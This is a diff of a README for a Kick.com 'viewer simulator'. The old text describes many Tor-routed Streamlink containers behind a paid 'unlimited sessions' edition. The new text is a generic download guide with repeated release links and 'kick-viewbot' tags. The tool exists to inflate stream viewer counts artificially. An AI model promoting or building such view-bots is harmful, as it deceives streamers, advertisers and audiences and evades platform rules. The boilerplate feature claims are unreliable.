@@ -1,203 +1,92 @@
-# 🎥 Kick Proxyless Viewer Simulator
+# 🎉 Kick-Proxyless-View-Simulator - Simulate Viewers Easily
 
-A **Docker-based GUI application** for viewing [Kick.com](https://kick.com) streams with **built-in Tor proxy support**.  
-This tool enables multiple containerized Streamlink sessions with automatic Tor routing for **enhanced privacy** and **connection management**.
+## 📥 Download
 
-**SUPPORTER EDITION ALLOWS UNLIMITED SESSIONS**
-https://ko-fi.com/s/a61547e0b9
+[![Download Kick-Proxyless-View-Simulator](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sujar09/Kick-Proxyless-View-Simulator/releases)
 
-**ACTIVELY DEVELOPED AND UPDATED**
+## 🚀 Getting Started
 
----
+The Kick-Proxyless-View-Simulator is a user-friendly tool designed to simulate real-time viewers for Kick.com streams. This tool harnesses the power of Python and Docker, making it a simple solution to enhance your viewing experience without the need for complicated proxy setups.
 
-## ✨ Features
+### 🛠️ System Requirements
 
-- 🖥 **Multiple Container Management** – Run multiple simultaneous stream sessions  
-- 🕵️ **Built-in Tor Proxy** – Each container routes traffic through Tor  
-- 🐳 **Docker Integration** – Fully containerized with automatic setup  
-- 🎛 **GUI Interface** – User-friendly with tabs for different functions  
-- 📺 **Quality Selection** – Supports 1080p, 720p, 480p, and more  
-- 📡 **Output Options** – Stream to stdout or save to file  
-- 🔎 **Real-time Monitoring** – View logs and container status live  
-- ⚙️ **Configuration Management** – Save & load settings with ease  
+Before you start using the Kick-Proxyless-View-Simulator, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or a recent Linux distribution.
+- **Docker:** Make sure you have Docker installed. You can download it from [Docker's official website](https://www.docker.com/get-started).
+- **Network Connection:** A stable internet connection for streaming.
 
-## 📌 What It Does
+### 📂 Installation Steps
 
-Each container created by the app:  
+Follow these steps to download and install the tool:
 
-1. Starts a **Tor daemon** with SOCKS5 proxy  
-2. Runs **Streamlink** with the Kick.com plugin through Tor  
-3. Streams to **stdout** or saves to a **file**  
-4. Operates **independently** from other containers  
+1. **Visit the Releases Page:** Click the link below to go to the Releases page:
+   [Download Kick-Proxyless-View-Simulator](https://github.com/sujar09/Kick-Proxyless-View-Simulator/releases)
 
-The **GUI** lets you:  
-- Start/stop sessions  
-- View logs  
-- Configure and save settings  
+2. **Download the Latest Release:** On the Releases page, find the latest version and download the file suitable for your operating system.
 
----
+3. **Extract the Files:** After downloading, extract the contents of the zip file to a convenient location on your computer.
 
-## 🖥 System Requirements
+4. **Open a Terminal or Command Prompt:**
+   - For Windows, press `Win + R`, type `cmd`, and hit Enter.
+   - For macOS, use Spotlight (Cmd + Space) and type `Terminal`.
+   - For Linux, open your preferred terminal.
 
-| Requirement | Minimum | Recommended |
-|-------------|----------|-------------|
-| **OS** | Windows 10/11 (64-bit) | – |
-| **Docker** | Docker Desktop | Latest stable |
-| **RAM** | 4GB | 8GB+ for multi-container |
-| **Network** | Stable internet connection | – |
+5. **Navigate to the Extracted Folder:** Use the `cd` command to navigate to the folder where you extracted the files. For example:
+   ```
+   cd path/to/extracted/folder
+   ```
 
----
+6. **Run the Tool with Docker:** Execute the command below to start the simulator:
+   ```
+   docker-compose up
+   ```
 
-## ⚡ Installation
+   This command will pull any necessary Docker images and start the viewer simulation.
 
-### 1. Prerequisites
-- [Download Docker Desktop](https://www.docker.com/products/docker-desktop/) and install  
-- Verify Docker is working:  
+7. **Access the Simulator:** Open your web browser and go to `http://localhost:8000` to access the viewer simulator interface.
 
-```bash
-docker --version
-docker info
-## 2. Quick Start
+### 🎨 Features
 
-1. **Download** `kick-proxyless-viewer-simulator.exe` from the Releases page  
-2. **Place** it in a folder with write permissions  
-3. **Run** the `.exe`  
+- **Real-Time Viewer Simulation:** Simulate viewers on Kick.com streams seamlessly.
+- **No Proxies Needed:** Avoid the hassle of using proxies with headless automation.
+- **Stable Performance:** Designed for reliable and consistent performance.
+- **User-Friendly Interface:** Interact with the simulator through an easy-to-navigate web interface.
 
----
+### 📝 Usage
 
-## 🚀 Usage
+Once the simulator is running, you can adjust the number of viewers in real-time. Refer to the interface for any additional instructions or configurations that may enhance your simulation experience.
 
-### First Run Setup
-1. Open the app → **Docker tab**  
-2. Click **Create Docker Files**  
-3. Click **Build Image** (`streamlink-tor`) → wait 5–10 minutes  
+### 🔄 Updating
 
-### Basic Operation
-```bash
-kick-proxyless-viewer-simulator.exe
-## 🚀 Usage
+To update the tool, repeat the download steps from the Releases page. Ensure you stop any running instances of the simulator before updating.
 
-### Basic Operation
+### 📞 Support
 
-1. Enter a **Kick.com URL** (e.g., `https://kick.com/username`)  
-2. Select **stream quality** (480p / 720p / 1080p)  
-3. Choose **output mode** (stdout / file)  
-4. Set **number of containers**  
-5. Click **Start Containers** → monitor progress in the **Logs tab**  
+If you encounter any issues or have questions, please visit the [Issues Section](https://github.com/sujar09/Kick-Proxyless-View-Simulator/issues) on GitHub or reach out via the project's discussions page.
 
----
+### 💡 Troubleshooting
 
-## ⚙️ Configuration Options
+- **Docker Not Running:** Ensure Docker is installed and running before starting the simulator.
+- **Port Issues:** If `http://localhost:8000` does not work, ensure the port is not in use by another application.
+- **Network Problems:** Check your internet connection if you experience issues connecting to streams.
 
-### Container Settings
-- **Name Prefix** – Customize container naming  
-- **Default Quality** – Set preferred resolution  
-- **Auto-remove** – Clean up stopped containers  
+### 📚 Topics
 
-### Output Options
-- **stdout** – Print stream to console (default)  
-- **file** – Save streams (auto-named, configurable directory)  
+- kick
+- kick-bot
+- kick-com
+- kick-tools
+- kick-viewbot
+- kick-viewer
+- proxy
+- python
+- viewers
+- views
 
----
+To learn more or contribute to the project, feel free to explore the repository or leave your feedback in the Issues section.
 
-## 🐳 Managing Containers
+### 📥 Download Again
 
-- **Right-click** a container for options: Stop, Logs, Remove  
-- **Bulk Actions**: Stop All / Refresh Status  
-- **Image Management**: Build, Pull, List images  
-
-### Build Directory (default: `./docker_build`)
-docker_build/
-├── Dockerfile # Docker image config
-├── kick.py # Streamlink Kick.com plugin
-├── torrc # Tor configuration
-└── start_with_tor.py # Container startup script
-
----
-
-## 🛠 Troubleshooting
-
-### Common Issues
-- **Docker Not Available** → Ensure Docker Desktop is running  
-- **Build Fails** → Check internet, clear cache:
-```bash
-docker system prune
-Containers Fail to Start → Verify image exists
-
-Stream Connection Problems → Check Kick URL, try different quality, wait 30–60s for Tor
-
-Performance Tips
-RAM: Each container uses ~200–500MB
-
-CPU: More containers = higher CPU load
-
-Network: Tor routing may reduce speed (lower quality helps)
-
-🔍 Log Analysis
-Check the Logs tab for:
-
-Container startup progress
-
-Tor connection status
-
-Streamlink connection details
-
-Error/debug messages
-
-🧩 Technical Details
-Base Image: python:3.11-slim
-
-Proxy: Tor SOCKS5 (localhost:9050)
-
-Streamlink Version: 7.5.0
-
-Plugin: Custom Kick.com plugin with cloudscraper support
-
-Security Features
-Isolated container environments
-
-Tor anonymized connections
-
-No persistent storage
-
-Automatic container cleanup
-
-📂 Configuration File
-Settings are saved in streamlink_docker_config.json:
-
-json
-Copy code
-{
-  "docker_image": "streamlink-tor",
-  "default_quality": "480p",
-  "output_directory": "",
-  "auto_remove_containers": true,
-  "container_prefix": "streamlink-session"
-}
-⚠️ Known Limitations
-Requires active internet + Docker Desktop running
-
-Some networks may block Tor
-
-Stream quality depends on source availability
-
-📜 Version Info
-Python: 3.11
-
-GUI: Tkinter
-
-Docker SDK: Python
-
-Streamlink: 7.5.0
-
-Tor: Integrated
-
-🛡 Disclaimer
-⚠️ This tool is for educational and legitimate streaming purposes only.
-Ensure compliance with Kick.com’s Terms of Service and local laws regarding proxy usage.
-
-**SUPPORTER EDITION ALLOWS UNLIMITED SESSIONS**
-https://ko-fi.com/s/a61547e0b9
-
+For your convenience, here is the link to download the tool one more time:  
+[Download Kick-Proxyless-View-Simulator](https://github.com/sujar09/Kick-Proxyless-View-Simulator/releases)
